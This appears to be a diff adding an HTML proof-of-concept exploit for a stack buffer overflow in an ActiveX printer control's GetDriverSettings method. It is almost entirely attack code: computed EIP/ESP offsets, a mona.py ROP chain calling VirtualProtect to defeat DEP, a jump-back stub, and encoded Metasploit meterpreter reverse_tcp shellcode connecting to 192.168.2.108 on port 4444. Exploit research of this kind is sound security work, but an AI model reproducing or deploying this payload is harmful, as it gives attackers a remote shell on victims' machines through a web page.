@@ -1,0 +1,178 @@
+<html>
+<object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' id='target'>
+</object>
+<script >
+
+offset_to_eip = 717;
+offset_to_esp = 737;
+buffer_length = 1000;
+
+function addressToString(address_string)
+{
+   if (address_string.length != 8) 
+   {
+      alert("Invalid address!");
+      return;
+   }
+
+   hex_byte1 = address_string.substring(0, 2);
+   hex_byte2 = address_string.substring(2, 4);
+   hex_byte3 = address_string.substring(4, 6);
+   hex_byte4 = address_string.substring(6);
+   
+   address = "%" + hex_byte4 + "%" + hex_byte3 + "%" + hex_byte2 + "%" + hex_byte1;
+   
+   return unescape(address);
+}
+
+function opcodesToString(opcodes_string)
+{
+   if (opcodes_string.length % 2 != 0) 
+   {
+      alert("Invalid opcodes!");
+      return;
+   }
+   
+   opcodes = '';
+   for (i=0; i < opcodes_string.length; i += 2)
+   {
+      opcodes += "%" + opcodes_string.substring(i, i+2);
+   }
+   
+   return unescape(opcodes);
+}
+
+// patch bytes in meterpreter payload
+shellcode = "";
+shellcode += opcodesToString("90");           // nop
+shellcode += opcodesToString("90");           // nop
+shellcode += opcodesToString("81c190feffff"); // add ecx,-170h
+shellcode += opcodesToString("c7014f69704b"); // mov dword ptr [ecx], 4b70694fh
+shellcode += opcodesToString("41");           // inc ecx
+shellcode += opcodesToString("41");           // inc ecx
+shellcode += opcodesToString("41");           // inc ecx
+shellcode += opcodesToString("41");           // inc ecx
+shellcode += opcodesToString("c7014f6b654c"); // mov dword ptr [ecx], 4c656b4fh
+
+// # msfpayload windows/meterpreter/reverse_tcp lhost=192.168.2.108 lport=4444 R | msfencode -e x86/alpha_mixed -b '\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f' -t c
+// [*] x86/alpha_mixed succeeded with size 440 (iteration=1)
+shellcode += opcodesToString("545edad8d976f45d55594949494949");
+shellcode += opcodesToString("494949494943434343434337515a6a");
+shellcode += opcodesToString("415850304130416b41415132414232");
+shellcode += opcodesToString("424230424241425850384142754a49");
+shellcode += opcodesToString("696c5a484e6273305770477051706c");
+shellcode += opcodesToString("4969754651795030644e6b72704470");
+shellcode += opcodesToString("6e6b6362544c4e6b305257644c4b62");
+shellcode += opcodesToString("525758566f6e57637a646656516b4f");
+shellcode += opcodesToString("4e4c656c3531534c3442364c57506b");
+shellcode += opcodesToString("717a6f466d4331395778624c323632");
+shellcode += opcodesToString("62774c4b527276704e6b637a356c6e");
+shellcode += opcodesToString("6b426c345153486863515845516851");
+shellcode += opcodesToString("42714c4b33696750566149436c4b42");
+shellcode += opcodesToString("6932387863547a67396e6b30344e6b");
+shellcode += opcodesToString("6551785654714b4f6e4c4b71484f54");
+shellcode += opcodesToString("4d6771384745684d3072554b465663");
+shellcode += opcodesToString("516d7968474b316d346451655a4473");
+shellcode += opcodesToString("686e6b7368657457715a7355364c4b");
+shellcode += opcodesToString("566c704b4e6b3638554c36614a736e");
+shellcode += opcodesToString("6b55544e6b477178504f7972645134");
+shellcode += opcodesToString("5464514b536b55315369436a736159");
+shellcode += opcodesToString("6f4b50336f514f636a4e6b64525a4b");
+shellcode += opcodesToString("6e6d314d4538503370326550433073");
+shellcode += opcodesToString("58543772536742636f52747178504c");
+shellcode += opcodesToString("725731367667696f78554e587a3076");
+shellcode += opcodesToString("617330677051394a64736462703538");
+shellcode += opcodesToString("51396f70524b6330696f6a75463052");
+shellcode += opcodesToString("704630763067305270373072703178");
+shellcode += opcodesToString("786a544f694f69704b4f6b654c5761");
+shellcode += opcodesToString("7a644572484b706d783332524c5068");
+shellcode += opcodesToString("466243307761336c6c495976717a42");
+shellcode += opcodesToString("304366614772484f696e4570745531");
+shellcode += opcodesToString("496f38556c456b706434544c496f72");
+shellcode += opcodesToString("6e455862555a4c30684c306c754f52");
+shellcode += opcodesToString("3276696f7a75617a6770435a644453");
+shellcode += opcodesToString("6662775178444268595a68514f796f");
+shellcode += opcodesToString("38554e6b3476306a47305178455062");
+shellcode += opcodesToString("30477075506146735a777062484638");
+shellcode += opcodesToString("793470533975596f58556d43436371");
+shellcode += opcodesToString("7a5770527661436367724867726949");
+shellcode += opcodesToString("6958314f4b4f385563317a63513978");
+shellcode += opcodesToString("4663457a4e78434141");
+
+junk1 = '';
+for (counter=0; counter < offset_to_eip - shellcode.length; counter++) junk1 += 'X';
+eip = addressToString("5c075142");
+
+junk2 = '';
+for (counter=0; counter < (offset_to_esp - offset_to_eip - eip.length); counter++) junk2 += 'Y';
+
+// rop chain generated with mona.py - www.corelan.be
+// Register setup for VirtualAlloc() :
+// --------------------------------------------
+// EAX = ptr to &VirtualProtect()
+// ECX = lpOldProtect (ptr to W address)
+// EDX = NewProtect (0x40)
+// EBX = dwSize
+// ESP = lPAddress (automatic)
+// EBP = POP (skip 4 bytes)
+// ESI = ptr to JMP [EAX]
+// EDI = ROP NOP (RETN)
+// + place ptr to "jmp esp" on stack, below PUSHAD
+// --------------------------------------------
+rop_chain = 
+      addressToString("5c0bcf4f") + // # POP EBP # RETN [NIPPLIB.DLL] 
+      addressToString("5c0bcf4f") + // # skip 4 bytes [NIPPLIB.DLL]
+      addressToString("5c0529f8") + // # POP EAX # RETN [NIPPLIB.DLL] 
+      addressToString("fffffdff") + // # Value to negate, will become 0x00000201
+      addressToString("5c080337") + // # NEG EAX # RETN [NIPPLIB.DLL] 
+      addressToString("5c08d949") + // # XCHG EAX,EBX # RETN [NIPPLIB.DLL] 
+      addressToString("5c06dc78") + // # POP EAX # RETN [NIPPLIB.DLL] 
+      addressToString("ffffffc0") + // # Value to negate, will become 0x00000040
+      addressToString("5c09cfd3") + // # NEG EAX # RETN [NIPPLIB.DLL] 
+      addressToString("5c06a72a") + // # XCHG EAX,EDX # RETN 0x00 [NIPPLIB.DLL] 
+      addressToString("5c0b6cfd") + // # POP ECX # RETN [NIPPLIB.DLL] 
+      addressToString("5c128f4e") + // # &Writable location [NIPPLIB.DLL]
+      addressToString("5c09c8ce") + // # POP EDI # RETN [NIPPLIB.DLL] 
+      addressToString("5c075142") + // # RETN (ROP NOP) [NIPPLIB.DLL]
+      addressToString("5c0766bf") + // # POP ESI # RETN [NIPPLIB.DLL] 
+      addressToString("5c01bbc0") + // # JMP [EAX] [NIPPLIB.DLL]
+      addressToString("5c06dc78") + // # POP EAX # RETN [NIPPLIB.DLL] 
+      addressToString("7e72121c") + // # ptr to &VirtualProtect() [IAT SXS.DLL]
+      addressToString("5c0839ac") + // # PUSHAD # RETN [NIPPLIB.DLL] 
+      addressToString("5c09beeb");  // # ptr to 'push esp # ret ' [NIPPLIB.DLL]
+
+jmp_back = opcodesToString("684e8f125c") + // push 0x5c128f4e 
+           opcodesToString("b8c0ffffff") + // mov  eax, 0xffffffc0
+           opcodesToString("f7d8") +       // neg  eax
+           opcodesToString("50") +         // push eax             
+           opcodesToString("b8fffdffff") + // mov  eax, 0xfffffdff
+           opcodesToString("f7d8") +       // neg  eax
+           opcodesToString("50") +         // push eax
+           opcodesToString("54") +         // push esp
+           opcodesToString("58") +         // pop eax
+           opcodesToString("05cffcffff") + // add  eax, -331h
+           opcodesToString("50") +         // push eax
+           opcodesToString("b81c12727e") + // mov  eax, 0x7e72121c
+           opcodesToString("ff10") +       // call [eax]
+           opcodesToString("54") +           // push esp
+           opcodesToString("59") +           // pop  ecx
+           opcodesToString("81c448f4ffff") + // add esp,-3000
+           opcodesToString("e9a0fcffff");    // jmp $-35bh to shellcode
+   
+junk3 = '';
+for (counter=0; counter < (buffer_length - shellcode.length - junk1.length - eip.length - junk2.length - rop_chain.length - jmp_back.length); counter++) junk3 += 'Z';
+
+ret = '';
+ret += shellcode + junk1 + eip + junk2 + rop_chain + jmp_back + junk3;
+
+arg1 = 'printer';
+arg2 = 'realm';
+arg3 = 'user';
+arg4 = 'pass';
+
+alert("Attach debugger and set a breakpoint to 0x5c075142!");
+
+target.GetDriverSettings(ret,arg2,arg3,arg4);
+
+</script>
+</html>
